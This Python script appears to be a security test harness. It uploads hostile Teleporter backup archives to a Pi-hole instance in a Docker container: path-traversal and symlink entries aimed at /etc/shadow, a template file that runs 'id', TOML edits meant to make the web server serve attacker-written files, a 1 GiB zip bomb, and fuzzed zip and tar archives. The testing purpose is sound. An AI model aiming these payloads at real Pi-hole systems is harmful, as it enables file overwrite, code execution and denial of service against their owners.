#!/usr/bin/env python3
"""Hostile Teleporter imports. usage: teleporter_test.py <target-ip> <container> <export.zip>"""
import io, json, os, random, struct, subprocess, sys, tarfile, time, urllib.request, uuid, zipfile, zlib, gzip

T, C, EXPORT = sys.argv[1:4]

def call(method, path, body=None, sid=None, ctype="application/json", raw=None, timeout=60):
    data = raw if raw is not None else (json.dumps(body).encode() if body is not None else None)
    r = urllib.request.Request(f"http://{T}{path}", data=data, method=method, headers={"sid": sid or "", "Content-Type": ctype})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as f: return f.status, f.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()

def login():
    for _ in range(40):
        s, b = call("POST", "/api/auth", {"password": "test"})
        if s == 200: return json.loads(b)["session"]["sid"]
        time.sleep(1.5)
    raise SystemExit("login failed")

def upload(sid, blob, name="tp.zip", imp=None):
    bnd = uuid.uuid4().hex
    parts = [f'--{bnd}\r\nContent-Disposition: form-data; name="file"; filename="{name}"\r\nContent-Type: application/zip\r\n\r\n'.encode() + blob + b"\r\n"]
    if imp is not None:
        parts.append(f'--{bnd}\r\nContent-Disposition: form-data; name="import"\r\n\r\n{json.dumps(imp)}\r\n'.encode())
    parts.append(f"--{bnd}--\r\n".encode())
    return call("POST", "/api/teleporter", raw=b"".join(parts), sid=sid, ctype=f"multipart/form-data; boundary={bnd}", timeout=120)

def sh(cmd):
    return subprocess.run(["docker", "exec", C, "sh", "-c", cmd], capture_output=True, text=True).stdout.strip()

def alive():
    return sh("dig +short +time=2 +tries=1 @127.0.0.1 pi.hole | tail -1") == "127.0.0.1" and bool(sh("pidof pihole-FTL"))

orig = zipfile.ZipFile(EXPORT)
toml = orig.read("etc/pihole/pihole.toml").decode()
gravity = orig.read("etc/pihole/gravity.db")
pid0 = sh("pidof pihole-FTL")

def mkzip(entries, symlinks=()):
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        for n, d in entries: z.writestr(n, d)
        for n, target in symlinks:
            zi = zipfile.ZipInfo(n); zi.create_system = 3; zi.external_attr = (0o120777 << 16)
            z.writestr(zi, target)
    return b.getvalue()

sid = login()
tests = []
def run(name, blob, check=None, fname="tp.zip"):
    global sid
    s, body = upload(sid, blob, fname)
    if s == 401: sid = login(); s, body = upload(sid, blob, fname)
    time.sleep(3)
    ok = alive()
    extra = check() if check else ""
    msg = body[:150].decode("latin-1").replace("\n", " ")
    print(f"- {name}: HTTP {s}; FTL alive: {ok}; {extra}\n    {msg}")
    tests.append((name, s, ok, extra))
    if not ok:
        time.sleep(15); print("    (after 15 s) alive:", alive())

# 1. entries outside the allowlist: traversal, absolute, extra files, symlinks
run("path traversal / absolute / extra names",
    mkzip([("../../../../tmp/tp_trav", b"x"), ("/tmp/tp_abs", b"x"), ("etc/pihole/../../tmp/tp_dot", b"x"),
           ("etc/pihole/q.lp", b"<? os.execute('id>/tmp/tp_lp') ?>"), ("etc/dnsmasq.d/evil.conf", b"dhcp-luascript=/x"),
           ("etc/pihole/dnsmasq.conf", b"# evil"), ("etc/pihole/pihole.toml", toml.encode())],
          symlinks=[("etc/pihole/dhcp.leases", "/etc/shadow"), ("etc/pihole/link", "/tmp")]),
    lambda: "files created outside the allowlist: " + (sh("ls /tmp/tp_trav /tmp/tp_abs /tmp/tp_dot /etc/pihole/q.lp /etc/dnsmasq.d/evil.conf /etc/pihole/link 2>/dev/null | tr '\\n' ' '") or "none")
            + "; dhcp.leases is symlink: " + sh("[ -L /etc/pihole/dhcp.leases ] && echo yes || echo no"))

# 2. pihole.toml that sets keys the API refuses
def toml_with(changes):
    t = toml
    for k, v in changes:
        import re
        t, n = re.subn(r"(?m)^(\s*)" + re.escape(k) + r" = .*?(?=\n\s*(?:#|\n|\[|[A-Za-z_]+ = ))", lambda m: f"{m.group(1)}{k} = {v}", t, count=1, flags=re.S)
        assert n == 1, k
    return t.encode()
for label, changes, probe in [
    ("toml: misc.dnsmasq_lines (script option)", [("dnsmasq_lines", '[ "dhcp-luascript=/etc/pihole/x.lua", "script-arp" ]')], "pihole-FTL --config misc.dnsmasq_lines"),
    ("toml: webserver.paths.webroot + webhome", [("webroot", '"/etc/pihole"'), ("webhome", '"/"')], "pihole-FTL --config webserver.paths.webroot"),
    ("toml: webserver.advancedOpts", [("advancedOpts", '[ "document_root=/etc/pihole" ]')], "pihole-FTL --config webserver.advancedOpts"),
    ("toml: files.log.dnsmasq -> .lp path", [("dnsmasq", '"/etc/pihole/q2.lp"')], "pihole-FTL --config files.log.dnsmasq"),
]:
    try: blob = mkzip([("etc/pihole/pihole.toml", toml_with(changes))])
    except AssertionError as e: print("- skip", label, e); continue
    run(label, blob, lambda p=probe: "value now: " + sh(p))
# restore original config
run("restore original toml", mkzip([("etc/pihole/pihole.toml", toml.encode())]), lambda: "webroot: " + sh("pihole-FTL --config webserver.paths.webroot") + " log: " + sh("pihole-FTL --config files.log.dnsmasq"))

# 3. resource abuse
big = io.BytesIO()
with zipfile.ZipFile(big, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
    with z.open("etc/pihole/gravity.db", "w", force_zip64=True) as f:
        chunk = b"\0" * (4 << 20)
        for _ in range(256): f.write(chunk)          # 1 GiB
t0 = time.time(); run(f"zip bomb: 1 GiB of zeros as gravity.db ({len(big.getvalue())>>10} KiB upload)", big.getvalue(),
    lambda: f"took {time.time()-t0:.0f}s; FTL RSS now {sh('grep VmRSS /proc/$(pidof pihole-FTL)/status')}")
run("upload larger than the 50 MiB limit (60 MiB of random)", os.urandom(60 << 20))

# 4. malformed archives
random.seed(1)
good = mkzip([("etc/pihole/pihole.toml", toml.encode()), ("etc/pihole/gravity.db", gravity), ("etc/pihole/dhcp.leases", b"")])
run("truncated zip", good[: len(good) // 2])
run("garbage with PK header", b"PK\x03\x04" + os.urandom(4096))
run("empty upload", b"")
crashes = 0
for i in range(150):
    b = bytearray(good)
    for _ in range(random.randint(1, 12)):
        p = random.randrange(len(b)); b[p] = random.randrange(256)
    if i % 5 == 0:   # hit the central directory / local headers specifically
        for _ in range(4):
            p = random.randrange(max(0, len(b) - 400), len(b)); b[p] = random.randrange(256)
    s, body = upload(sid, bytes(b))
    if s == 401: sid = login()
    if not alive():
        crashes += 1; print(f"    mutated zip #{i}: FTL not answering (HTTP {s})"); open(f"/tmp/crash-zip-{i}.zip", "wb").write(bytes(b)); time.sleep(20)
print(f"- 150 mutated zips: FTL stopped answering {crashes} time(s)")

# 5. gravity.db that is not a database / hostile SQL objects
run("gravity.db is not SQLite", mkzip([("etc/pihole/gravity.db", b"not a database" * 1000)]))

# 6. legacy v5 tar.gz import path
def mktar(entries, links=()):
    b = io.BytesIO()
    with tarfile.open(fileobj=b, mode="w:gz") as t:
        for n, d in entries:
            ti = tarfile.TarInfo(n); ti.size = len(d); t.addfile(ti, io.BytesIO(d))
        for n, target in links:
            ti = tarfile.TarInfo(n); ti.type = tarfile.SYMTYPE; ti.linkname = target; t.addfile(ti)
    return b.getvalue()
run("v5 tar.gz with traversal names and symlink", mktar([("../../tmp/tp_tar_trav", b"x"), ("/tmp/tp_tar_abs", b"x"), ("adlist.json", b"[]"), ("setupVars.conf", b"WEBPASSWORD=x\n")], links=[("custom.list", "/etc/shadow")]),
    lambda: "created: " + (sh("ls /tmp/tp_tar_trav /tmp/tp_tar_abs 2>/dev/null | tr '\\n' ' '") or "none"), fname="tp.tar.gz")
tgood = mktar([("adlist.json", b'[{"id":1,"address":"http://x/y","enabled":1,"date_added":1,"comment":"c"}]'), ("blacklist.exact.json", b"[]"), ("setupVars.conf", b"PIHOLE_DNS_1=8.8.8.8\n"), ("custom.list", b"1.2.3.4 a.b\n")])
raw_tar = gzip.decompress(tgood); crashes = 0
for i in range(150):
    b = bytearray(raw_tar)
    for _ in range(random.randint(1, 10)):
        p = random.randrange(len(b)); b[p] = random.randrange(256)
    if i % 3 == 0:  # corrupt a size field (octal, offset 124 of a header)
        b[124:135] = bytes(random.choice(b"0123456789 \x00\xff") for _ in range(11))
    s, body = upload(sid, gzip.compress(bytes(b)), "tp.tar.gz")
    if s == 401: sid = login()
    if not alive():
        crashes += 1; print(f"    mutated tar #{i}: FTL not answering (HTTP {s})"); open(f"/tmp/crash-tar-{i}.tgz", "wb").write(gzip.compress(bytes(b))); time.sleep(20)
print(f"- 150 mutated v5 tar.gz archives: FTL stopped answering {crashes} time(s)")
print("FTL pid before/after:", pid0, sh("pidof pihole-FTL"), "| restarts seen in log:", sh("grep -c 'FTL started' /var/log/pihole/FTL.log"), "| crash lines:", sh("grep -ciE 'segfault|SIGSEGV|crash|backtrace|!!!' /var/log/pihole/FTL.log"))
